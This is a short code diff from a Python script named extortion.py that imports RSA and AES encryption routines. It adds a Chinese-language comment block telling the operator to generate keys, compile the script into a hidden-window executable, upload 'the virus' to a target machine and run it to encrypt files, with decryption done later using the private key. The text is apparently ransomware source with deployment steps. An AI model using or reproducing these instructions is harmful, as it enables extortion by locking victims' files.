@@ -8,6 +8,12 @@ from Crypto.PublicKey import RSA
 from Crypto.Cipher import AES, PKCS1_OAEP
 from Crypto.Random import get_random_bytes
 
+"""
+ 执行python extortion.py get创建密钥对，将public.pub里的值复制到变量public_key中 
+ 使用pyinstaller -F -w extortion.py生成exe文件 ，然后将病毒上传到目标机器上       
+ 执行extortion.exe开始加密                                                     
+ 解密时将private.pem文件上传到病毒路径下，执行extortion.exe de解密               
+"""
 lock = threading.Lock()
 threads = []
 skip_dic=[
